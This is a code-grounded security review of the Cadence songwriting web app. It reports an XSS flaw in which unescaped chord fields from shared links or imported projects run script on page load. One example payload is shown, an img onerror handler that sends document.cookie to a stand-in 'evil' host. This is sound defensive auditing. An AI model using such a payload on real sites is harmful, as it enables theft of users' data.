# Security Review — Cadence

Code-grounded review against the standard 20-point pen-test checklist. Cadence is a fully
offline, client-only songwriting sandbox (Web Audio synth, no backend, no accounts). The only
network dependency is the optional Google Fonts stylesheet; all composition/playback/save data
lives in `localStorage` on the device.

## Findings outside the 20-point list

1. **Stored/reflected XSS via chord names in shared-link and imported-project data — the app's
   own "Shareable URL" and "JSON project import" features (`render()` / `renderChart()`,
   `assets/cadence.js:13,34`).**

   `escapeHtml()` (`assets/cadence.js:42`, full `&<>"'` escaping) exists and is correctly applied
   to the take `name`/`mood` fields in the saved-takes library view (`renderLibrary()`,
   `assets/cadence.js:41`). It is **not** applied to the per-chord `name`/`rn` fields when the
   current progression is rendered:
   - `render()` (`assets/cadence.js:13`) builds the chord lane as
     `` `...aria-label="Audition chord ${i+1}, ${c.name}">...${c.rn}...${c.name}...` `` — `c.name`
     lands unescaped both inside an `aria-label` attribute and inside a `<div>` text node;
     `c.rn` lands unescaped in a `<span>`.
   - `renderChart()` (`assets/cadence.js:34`) does the same for the Roman-numeral chart:
     `` `<div class="roman-item"><span>${c.rn}</span><small>${c.name}</small></div>` ``.

   Nothing generated by the app itself ever puts attacker-controlled text in `c.name`/`c.rn` (they
   come from the hardcoded chord-naming logic), **but three paths let external data set `prog`
   directly and then call `render()` immediately**, so a crafted value reaches these unescaped
   sinks:
   - **Shared link, fully automatic.** `init()` (`assets/cadence.js:54`) parses
     `location.hash` when it starts with `#take=`, base64-decodes and `JSON.parse`s it with no
     shape/type validation beyond `if(o.prog)`, assigns `prog=o.prog`, and calls `render()` —
     all before any user interaction. Anyone who opens a Cadence link containing a hand-crafted
     `#take=` payload (e.g. a chord object with
     `"name":"<img src=x onerror=fetch('https://evil/'+document.cookie)>"`) runs that payload
     immediately on page load. This is the same `share()` link format Cadence itself generates
     (`assets/cadence.js:51`), so it's trivial for an attacker to build one by hand.
   - **JSON project import.** The `import-file` handler (`assets/cadence.js:54`, the
     `onchange=async e=>{...}` block) only checks `obj.prog` or `obj.format==='cadence-sketch-v1'`
     exists before storing the whole parsed object into `saved` — it never validates the shape or
     content of individual chord entries.
   - **Opening an imported (or otherwise tampered) saved take.** `loadTake()`
     (`assets/cadence.js:43`) takes `prog=t.prog` straight from the saved-take object and calls
     `render()` — so a malicious take that got into `saved` via import (or direct `localStorage`
     editing) fires the same injection the moment the user clicks "Open take."

   Impact: arbitrary script execution in the victim's page on simply opening a shared link (no
   file import needed) — able to read/exfiltrate anything in that origin's `localStorage`
   (all saved takes) or deface the page. This is a materially more exploitable variant of the
   escaping gaps seen elsewhere in this portfolio, because the share-link path requires no action
   from the victim beyond following a link. Not fixed — pending your approval; the fix is to run
   `escapeHtml()` over `c.name`/`c.rn` (and any other free-text chord field) at both sinks, and to
   validate/sanitize imported/shared `prog` entries the same way `sanitizeSave`-style allowlisting
   is done elsewhere in this portfolio, rather than trusting their shape.

Nothing else outside the list: the share link's base64 payload is not treated as a secret or an
auth token (it's meant to be shared, per the README), so its lack of encryption/signing is
expected, not a flaw in itself — the real problem is the missing escaping on render, above.
